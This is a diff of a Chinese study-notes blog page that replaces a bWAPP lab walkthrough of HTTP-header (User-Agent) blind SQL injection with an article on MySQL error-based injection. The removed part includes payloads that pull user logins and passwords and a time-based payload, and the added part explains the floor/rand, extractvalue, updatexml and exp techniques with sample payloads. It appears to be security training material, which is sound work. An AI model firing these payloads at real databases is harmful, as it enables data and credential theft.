@@ -17,7 +17,7 @@
   <meta name="description" content="">
   <meta name="author" content="Tachiu Lam">
   <meta name="keywords" content="">
-  <title>《Web攻防安全实战》学习总结：SQL注入实战——HTTP头盲注 - Tachiu Lam</title>
+  <title>《Web攻防安全实战》学习总结：SQL注入实战——数据库报错注入 - Tachiu Lam</title>
 
   <link  rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css" />
 <link  rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/4.0.0/github-markdown.min.css" />
@@ -132,8 +132,8 @@
               
                 <div class="mt-3 post-meta">
                   <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-                  <time datetime="2021-01-09 16:48">
-                    2021年1月9日 下午
+                  <time datetime="2021-01-17 16:02">
+                    2021年1月17日 下午
                   </time>
                 </div>
               
@@ -143,7 +143,7 @@
                   
                   <span class="post-meta mr-2">
                     <i class="iconfont icon-chart"></i>
-                    569 字
+                    839 字
                   </span>
                 
 
@@ -153,7 +153,7 @@
                       <i class="iconfont icon-clock-fill"></i>
                     
                     
-                    7
+                    10
                      分钟
                   </span>
                 
@@ -183,26 +183,30 @@
             
               <p class="note note-info">
                 
-                  本文最后更新于：2021年1月9日 下午
+                  本文最后更新于：2021年1月17日 下午
                 
               </p>
             
             <article class="markdown-body">
-              <h1 id="HTTP头盲注"><a href="#HTTP头盲注" class="headerlink" title="HTTP头盲注"></a>HTTP头盲注</h1><h2 id="HTTP头部注入"><a href="#HTTP头部注入" class="headerlink" title="HTTP头部注入"></a>HTTP头部注入</h2><p>针对HTTP的请求头，如果不进行过滤和转义，直接与数据库进行交互，就容易被利用进行SQL注入攻击，即HTTP头注入。</p>
-<h2 id="HTTP头盲注实战"><a href="#HTTP头盲注实战" class="headerlink" title="HTTP头盲注实战"></a>HTTP头盲注实战</h2><h3 id="判断注入点"><a href="#判断注入点" class="headerlink" title="判断注入点"></a>判断注入点</h3><p>选择bwapp相应的漏洞靶场SQL Injection - Stored (User-Agent)，页面会记录登录设备的UA和IP。<br><img src="/img/sql/httpheader/httpheader1.png" srcset="/img/loading.gif" alt="fileupload"><br>burpsuite抓包修改UA值，发现UA可控，且添加单引号判断存在注入点：<br><img src="/img/sql/httpheader/httpheader2.png" srcset="/img/loading.gif" alt="fileupload"><br><img src="/img/sql/httpheader/httpheader3.png" srcset="/img/loading.gif" alt="fileupload"><br>通过页面判断，ip和UA的值都是由用户输入后端服务的，猜测使用insert … value … 语句，构造语句，同时利用 # 闭合sql语句排除干扰，观察页面，ip和UA被成功修改：<br><img src="/img/sql/httpheader/httpheader4.png" srcset="/img/loading.gif" alt="fileupload"><br><img src="/img/sql/httpheader/httpheader5.png" srcset="/img/loading.gif" alt="fileupload"><br>简单构造注入语句，查询数据库名称：<br><img src="/img/sql/httpheader/httpheader7.png" srcset="/img/loading.gif" alt="fileupload"><br><img src="/img/sql/httpheader/httpheader8.png" srcset="/img/loading.gif" alt="fileupload"></p>
-<h3 id="获取用户表名"><a href="#获取用户表名" class="headerlink" title="获取用户表名"></a>获取用户表名</h3><p>构造语句获取数据库表：<br><img src="/img/sql/httpheader/httpheader9.png" srcset="/img/loading.gif" alt="fileupload"><br>发现每次返回数据行数限制为1行，修改语句再次执行，返回的表名为blog不是用户表：<br><img src="/img/sql/httpheader/httpheader10.png" srcset="/img/loading.gif" alt="fileupload"><br>通过offset控制返回第几条，当offset=3时，返回用户表users：<br><img src="/img/sql/httpheader/httpheader11.png" srcset="/img/loading.gif" alt="fileupload"></p>
-<pre><code class="hljs plain">123&#39;,(select table_name from information_schema.tables where table_schema&#x3D;database() limit 1 offset 3)); #</code></pre>
-<h3 id="获取用户表信息"><a href="#获取用户表信息" class="headerlink" title="获取用户表信息"></a>获取用户表信息</h3><p>过程和上述类似，利用以下指令即可查得id,继续利用偏移查询 id login password 分别位于偏移 0, 1, 2 处</p>
-<pre><code class="hljs plain">111&#39;, (select column_name from information_schema.columns where table_name&#x3D;&#39;users&#39; limit 1 offset 0)); #</code></pre>
-<p><img src="/img/sql/httpheader/httpheader12.png" srcset="/img/loading.gif" alt="fileupload"></p>
-<h3 id="获取用户名密码"><a href="#获取用户名密码" class="headerlink" title="获取用户名密码"></a>获取用户名密码</h3><pre><code class="hljs plain">111&#39;, (select login from users limit 1 offset 2)); #</code></pre>
-<p>将login替换为id、password 同时修改offset值，即可获得相应用户的密码信息。<br><img src="/img/sql/httpheader/httpheader13.png" srcset="/img/loading.gif" alt="fileupload"></p>
-<h2 id="漏洞进阶"><a href="#漏洞进阶" class="headerlink" title="漏洞进阶"></a>漏洞进阶</h2><h3 id="修改靶场代码逻辑"><a href="#修改靶场代码逻辑" class="headerlink" title="修改靶场代码逻辑"></a>修改靶场代码逻辑</h3><pre><code class="hljs plain">&#x2F;&#x2F; Writes the entry into the database
-$sql &#x3D; &quot;INSERT INTO visitors (date, user_agent, ip_address) VALUES (now(), &#39;&quot; . sqli($user_agent) . &quot;&#39;, &#39;&quot; . $ip_address . &quot;&#39;)&quot;;</code></pre>
-<p>原始的逻辑，ip是放在ua之后显示的，现在修改代码逻辑，将ip与ua替换位置：</p>
-<pre><code class="hljs plain">$sql &#x3D; &quot;INSERT INTO visitors (date, ip_address, user_agent) VALUES (now(), &#39;&quot; . sqli($ip_address) . &quot;&#39;, &#39;&quot; . $user_agent . &quot;&#39;)&quot;;</code></pre>
-<p>这样处理后，服务端就不会返回我们构造的上述SQL注入语句的执行结果了。<br>此时可采用基于时间盲注的方式，通过页面的响应时间，判断SQL语句是否成功执行，再通过脚本自动测试完成信息获取：</p>
-<pre><code class="hljs plain">123&#39;+ (select 1 from (select user()) as t where length((select database())) &#x3D; 5 and sleep(2))); #</code></pre>
+              <h1 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h1><h2 id="MySQL报错注入主要分类"><a href="#MySQL报错注入主要分类" class="headerlink" title="MySQL报错注入主要分类"></a>MySQL报错注入主要分类</h2><p>1、BigInt等数据类型溢出<br>2、Xpath语法错误<br>3、count() + rand() + group_by()导致重复<br>4、空间数据类型函数错误</p>
+<h2 id="报错注入常用函数"><a href="#报错注入常用函数" class="headerlink" title="报错注入常用函数"></a>报错注入常用函数</h2><h3 id="1、floor函数"><a href="#1、floor函数" class="headerlink" title="1、floor函数"></a>1、floor函数</h3><h4 id="相关函数："><a href="#相关函数：" class="headerlink" title="相关函数："></a>相关函数：</h4><pre><code class="hljs plain">floor(): 去除小数部分
+count(x): 返回x数据集的数量
+rand(): 产生随机数
+rand(x): 每个x对应一个固定的值，但是如果连续执行多次值会变化，不过也是可预测的
+floor(rand(0)*2):对应的有规律数列为 011011...</code></pre>
+<h4 id="注入SQL："><a href="#注入SQL：" class="headerlink" title="注入SQL："></a>注入SQL：</h4><pre><code class="hljs plain">select count(*) ,concat(database(),floor(rand(0)*2))x from test group by x ：x表示前面括号内的别名</code></pre>
+<h4 id="报错信息："><a href="#报错信息：" class="headerlink" title="报错信息："></a>报错信息：</h4><pre><code class="hljs plain">Can&#39;t write；duplicate key in table ‘&#x2F;tmp&#x2F;#sql935_27_2f’</code></pre>
+<h4 id="原理剖析："><a href="#原理剖析：" class="headerlink" title="原理剖析："></a>原理剖析：</h4><p>该注入的关键函数是group by x，即group by (floor(rand(0)<em>2))；首先明白两个概念：group by查询会新建一张虚拟表，保存查询的结果，而rand函数每被调用一次就会进行一次计算。<br>如下图，sql语句第一次执行时，floor(rand(0)</em>2)=0，查询虚拟表主键0，不存在，判断直接插入，在插入时会在group by x再次计算floor(rand(0)<em>2)=1，因此实际插入的主键值=1；第二次查询时floor(rand(0)</em>2)=1，主键存在，主键直接+1插入即可；再次进行floor(rand(0)<em>2)计算，此时是floor(rand(0)</em>2)的第四次运算，值为0，需要插入主键为0的数据，和第一次插入一样，执行过程会运行group by x，实际插入的主键值变成1，导致主键重复，数据库报错。<br><img src="/img/sql/errorbase/error1.png" srcset="/img/loading.gif" alt="fileupload"></p>
+<h3 id="2、extractvalue函数（最多32字符）"><a href="#2、extractvalue函数（最多32字符）" class="headerlink" title="2、extractvalue函数（最多32字符）"></a>2、extractvalue函数（最多32字符）</h3><p>extractvalue() :对XML文档进行查询的函数</p>
+<p>其实就是相当于我们熟悉的HTML文件中用 <div><p><a>标签查找元素一样<br>语法：extractvalue(目标xml文档，xml路径)</p>
+<p>第二个参数 xml中的位置是可操作的地方，xml文档中查找字符位置是用 /xxx/xxx/xxx/…这种格式，<br>如果我们写入其他格式，就会报错，并且会返回我们写入的非法格式内容，而这个非法的内容就是我们想要查询的内容。<br>正常查询 第二个参数的位置格式 为 /xxx/xx/xx/xx ,即使查询不到也不会报错</p>
+<h4 id="注入SQL：-1"><a href="#注入SQL：-1" class="headerlink" title="注入SQL："></a>注入SQL：</h4><pre><code class="hljs plain">?id&#x3D;1&#39; and extractvalue(1, concat(0x7e (select @@version))) --&#39;</code></pre>
+<h4 id="原理剖析：-1"><a href="#原理剖析：-1" class="headerlink" title="原理剖析："></a>原理剖析：</h4><p>使用concat函数，将错误信息进行拼接，使用0x7e波浪号，extractvalue函数无法处理的字符，防止select @@version 被截断<br><img src="/img/sql/errorbase/error2.png" srcset="/img/loading.gif" alt="fileupload"></p>
+<h3 id="3、updatexml函数"><a href="#3、updatexml函数" class="headerlink" title="3、updatexml函数"></a>3、updatexml函数</h3><p>updatexml()函数与extractvalue()类似，是更新xml文档的函数。<br>语法updatexml(目标xml文档，xml路径，更新的内容)</p>
+<p>extractvalue()、updatexml()能查询字符串的最大长度为32，就是说如果我们想要的结果超过32，就需要用substring()函数截取，一次查看32位</p>
+<h4 id="注入SQL：-2"><a href="#注入SQL：-2" class="headerlink" title="注入SQL："></a>注入SQL：</h4><pre><code class="hljs plain">?id&#x3D;2&#39; and updatexml(1, concat(0x7e (select @@version))) --&#39;</code></pre>
+
+<h3 id="4、exp-函数"><a href="#4、exp-函数" class="headerlink" title="4、exp()函数"></a>4、exp()函数</h3><h4 id="相关函数"><a href="#相关函数" class="headerlink" title="相关函数"></a>相关函数</h4><p>～():取反函数，例如一个正数取反，会变成一个负数，负数用数字形式表示是一个很庞大的数字，传入exp会导致exp函数无法处理从而报错，如下图：<br><img src="/img/sql/errorbase/error3.png" srcset="/img/loading.gif" alt="fileupload"><br>注意，exp()产生错误，只会返回执行语句的表达式，需要联合后端脚本语言进行解析，从而返回相应的执行结果</p>
 
             </article>
             <hr>
@@ -237,18 +241,12 @@ $sql &#x3D; &quot;INSERT INTO visitors (date, user_agent, ip_address) VALUES (no
                   <div class="post-prev col-6">
                     
                     
-                      <a href="/2021/01/17/%E3%80%8AWeb%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E5%AE%9E%E6%88%98%E3%80%8B%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93%EF%BC%9ASQL%E6%B3%A8%E5%85%A5%E5%AE%9E%E6%88%98%E2%80%94%E2%80%94%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">《Web攻防安全实战》学习总结：SQL注入实战——数据库报错注入</span>
-                        <span class="visible-mobile">上一篇</span>
-                      </a>
-                    
                   </div>
                   <div class="post-next col-6">
                     
                     
-                      <a href="/2021/01/08/%E3%80%8AWeb%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E5%AE%9E%E6%88%98%E3%80%8B%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93%EF%BC%9ASQL%E6%B3%A8%E5%85%A5%E5%AE%9E%E6%88%98%E2%80%94%E2%80%94%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8/">
-                        <span class="hidden-mobile">《Web攻防安全实战》学习总结：SQL注入实战——利用时间盲注绕过无报错无回显场景</span>
+                      <a href="/2021/01/09/%E3%80%8AWeb%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E5%AE%9E%E6%88%98%E3%80%8B%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93%EF%BC%9ASQL%E6%B3%A8%E5%85%A5%E5%AE%9E%E6%88%98%E2%80%94%E2%80%94HTTP%E5%A4%B4%E7%9B%B2%E6%B3%A8/">
+                        <span class="hidden-mobile">《Web攻防安全实战》学习总结：SQL注入实战——HTTP头盲注</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
@@ -446,7 +444,7 @@ $sql &#x3D; &quot;INSERT INTO visitors (date, user_agent, ip_address) VALUES (no
     var typed = new Typed('#subtitle', {
       strings: [
         '  ',
-        "《Web攻防安全实战》学习总结：SQL注入实战——HTTP头盲注&nbsp;",
+        "《Web攻防安全实战》学习总结：SQL注入实战——数据库报错注入&nbsp;",
       ],
       cursorChar: "_",
       typeSpeed: 70,
